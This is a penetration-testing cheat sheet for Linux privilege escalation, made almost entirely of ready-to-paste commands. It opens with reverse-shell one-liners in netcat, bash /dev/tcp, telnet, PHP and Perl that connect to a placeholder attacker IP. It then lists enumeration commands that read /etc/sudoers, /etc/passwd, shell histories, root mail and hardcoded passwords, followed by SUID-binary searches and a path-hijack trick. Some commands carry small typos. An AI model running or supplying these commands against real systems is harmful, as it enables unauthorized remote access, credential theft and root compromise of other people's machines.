*Linux elevation of privileges*narrative

Getting a reverse shell
    Using netcat
    *nc <attacker_ip> <port> -e /bin/bash*
    Using bash and TCP sockets
    */bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1*
    Using bash and TCP sockets
    *0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196*
    Using sh
    0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196
    Using telnet
    *telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>*
    PHP and sh
    *php -r '$sock=fsockopen("<attacker_ip>",<port);exec("/bin/sh -i <&3 >&3 2>&3");'*
    Perl and sh
    *perl -e 'use Socket;$i="<attacker_ip>";$p=<port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'*
Post exploitation
    Get a TTY shell after a reverse shell connection
    *$ python -c 'import pty;pty.spawn("/bin/bash")'*
    Command to skip ignored lines in config files
    *$ alias nonempty="egrep -v '^[ \t]*#|^$'"*

Linux elevation of privileges

    Find linux distribution & version
    *$ cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;*

    Architecture
    *$ cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-*

    Environment variables
    *$ cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set*

    Find printers
    *$ lpstat -a*

    Find apps installed;
    *$ ls -alh /usr/bin/; ls -alh /sbin/; dpkg -l; rpm -qa; ls -alh /var/cache/apt/archivesO; ls -alh /var/cache/yum/*;

    Missconfigured services
    *$ cat /etc/syslog.conf; cat /etc/chttp.conf; cat /etc/lighttpd.conf; cat /etc/cups/cupsd.conf; cat /etc/inetd.conf; cat /etc/apache2/apache2.conf; cat /etc/my.conf; cat /etc/httpd/conf/httpd.conf; cat /opt/lampp/etc/httpd.conf; ls -aRl /etc/ | awk '$1 ~ /^.*r.*/*

    Scheduled jobs
    *$ crontab -l; ls -alh /var/spool/cron; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny*

    Grep hardcoded passwords
    *$ grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"*

    Network configuration
    *$ /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname*

    List other users home directories
    *$ ls -ahlR /root/; ls -ahlR /home/*

    User bash history
    *$ cat ~/.bash_history; cat ~/.nano_history; cat ~/.atftp_history; cat ~/.mysql_history; cat ~/.php_history*

    User mails
    *$ cat ~/.bashrc; cat ~/.profile; cat /var/mail/root; cat /var/spool/mail/root*

    Find interesting binaries
    *$ find / -name wget; find / -name nc*; find / -name netcat*; find / -name tftp*; find / -name ftp*

    Mounted filesystems
    *$ mount; df -h; cat /etc/fstab*

    Look for binaries with the SUID or GUID bits set.
    *$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
$ find / -perm -1000 -type d 2>/dev/null
$ find / -perm -g=s -type f 2>/dev/null*

    Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path.
    *$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
$ export -f /usr/bin/foo
$ /usr/bin/foo
It works*

    Find other uses in the system
    *$id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l*

    World readable/writable files:
    *$ echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;*
    Find world-readable files:
    *$ find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print*
    Find nobody owned files
    *$ find /dir -xdev \( -nouser -o -nogroup \) -print*

    Other scripts
    *https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py*
